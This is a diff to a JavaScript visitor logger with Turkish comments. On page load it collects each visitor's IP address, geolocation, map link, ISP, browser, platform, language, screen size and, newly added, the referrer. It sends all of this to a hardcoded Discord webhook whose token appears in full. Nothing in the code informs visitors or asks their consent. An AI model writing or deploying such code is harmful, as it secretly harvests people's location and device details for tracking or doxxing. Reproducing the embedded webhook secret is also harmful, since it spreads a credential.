@@ -1,3 +1,4 @@
+/*yeni*/
 var ip = '';
 var latitude = '';
 var longitude = '';
@@ -9,6 +10,8 @@ var browserInfo = navigator.userAgent;
 var dateVisited = new Date().toUTCString();
 var language = navigator.language;
 var platform = navigator.platform;
+var referrer = document.referrer; // Sayfa referansını al
+
 
 fetch('https://ipapi.co/json/')
   .then(function(response) {
@@ -20,7 +23,7 @@ fetch('https://ipapi.co/json/')
     longitude = data.longitude;
     city = data.city;
     country = data.country_name;
-    org = data.org; // 'org' bilgisini alın
+    org = data.org;
 
     mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
 
@@ -28,9 +31,22 @@ fetch('https://ipapi.co/json/')
     var ekranGenislik = window.screen.width;
     var ekranYukseklik = window.screen.height;
 
-    var message = 'IP: **' + ip + '**\nLatitude: ' + latitude + '\nLongitude: ' + longitude + '\nCity: ' + city + '\nCountry: ' + country + '\nOrganization: ' + org + '\nMap Link: ' + mapLink + '\n\nBrowser Info: ' + browserInfo + '\nDate Visited: ' + dateVisited + ' **(' + platform + ')**\nLanguage: ' + language + '\nZaman: ' + yerelZaman + '\nEkran Genişliği: ' + ekranGenislik + '*' + ekranYukseklik;
+    var message = 
+      'IP: **' + ip + '**\n' +
+      'Latitude: ' + latitude + '\n' +
+      'Longitude: ' + longitude + '\n' +
+      'City: ' + city + '\n' +
+      'Country: ' + country + '\n' +
+      'Organization: ' + org + '\n' +
+      'Map Link: ' + mapLink + '\n\n' +
+      'Browser Info: ' + browserInfo + '\n' +
+      'Date Visited: ' + dateVisited + ' **(' + platform + ')**\n' +
+      'Language: ' + language + '\n' +
+      'Zaman: ' + yerelZaman + '\n' +
+      'Ekran Genişliği: ' + ekranGenislik + '*' + ekranYukseklik + '\n' +
+      'Referrer: ' + referrer; // Sayfa referansını mesajın sonuna ekle
 
-    var webhookURL = 'https://discord.com/api/webhooks/1125334024328597514/9RPHIBPRqXQrbzDOTRMNtjGe0u6SGNHjwD8JoXAcU6Q6u1itE1c7-1g5ive4wh_WUZZR'; // Discord webhook URL'sini buraya yapıştırın
+    var webhookURL = 'https://discord.com/api/webhooks/1125334024328597514/9RPHIBPRqXQrbzDOTRMNtjGe0u6SGNHjwD8JoXAcU6Q6u1itE1c7-1g5ive4wh_WUZZR';
 
     fetch(webhookURL, {
       method: 'POST',
